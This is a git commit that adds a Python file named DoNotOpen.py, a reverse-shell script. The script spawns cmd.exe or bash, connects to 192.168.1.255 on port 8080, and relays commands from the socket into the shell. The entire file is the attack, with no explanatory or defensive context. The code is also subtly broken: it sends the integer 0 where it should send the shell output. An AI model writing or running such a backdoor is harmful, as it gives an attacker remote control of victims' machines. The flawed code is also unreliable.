b1f3f517414f3afac4e551efe5bb239f6e3dc0ca
ilya blanko <ilya@blanko.blanko>
2024-11-27 15:37:58 +0300

    first

---
+++ DoNotOpen.py
@@ -0,0 +1,30 @@
+import socket
+import os
+import threading
+import subprocess as sp
+import platform
+
+ip_addr = '192.168.1.255'
+port = 8080
+
+if platform.system() == 'Windows':
+    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
+else:
+    p = sp.Popen(['/bin/bash'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
+
+
+s = socket.socket()
+s.connect((ip_addr,port))
+
+def read_and_send():
+    while True:
+        o = os.read(p.stdout.fileno(), 1024)
+        s.send(0)
+        
+def recv_and_write():
+    while True:
+        i = s.recv(1024)
+        os.write(p.stdin.fileno(), i)
+        
+threading.Thread(target=read_and_send, daemon= True).start()
+threading.Thread(target=recv_and_write).start()        
